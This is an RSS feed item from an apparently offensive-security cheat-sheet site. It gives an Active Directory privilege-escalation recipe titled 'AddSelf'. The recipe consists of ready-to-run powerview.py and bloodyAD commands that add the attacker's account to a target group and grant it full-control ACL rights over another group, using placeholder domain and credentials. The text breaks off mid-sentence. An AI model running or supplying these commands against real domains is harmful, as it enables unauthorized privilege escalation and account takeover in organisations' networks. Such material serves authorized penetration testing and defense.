channel.title: Addself on TLDRBins
channel.description: Recent content in Addself on TLDRBins

item.title: AddSelf
item.description: Privesc #1: Add self to group (From Linux) powerview.py bloodyAD # Connect sudo ntpdate -s <DC> && powerview <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_DOMAIN> # Add self to group Add-DomainGroupMember -Identity <TARGET_GROUP> -Members <USERNAME> # Check Get-DomainGroupMember -Identity <TARGET_GROUP> # Exit and login again to apply changes Add-DomainObjectAcl -TargetIdentity <ANOTHER_GROUP> -PrincipalIdentity <USERNAME> -Rights fullcontrol # Check Get-DomainObjectAcl -Identity <TARGET_USER_IN_ANOTHER_GROUP> -Where "SecurityIdentifier contains <USERNAME>" Ref: powerview.py # Add self to group python3 bloodyAD.py -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --host <DC> add groupMember <TARGET_GROUP> <USERNAME> # After getting full control of target group (e.
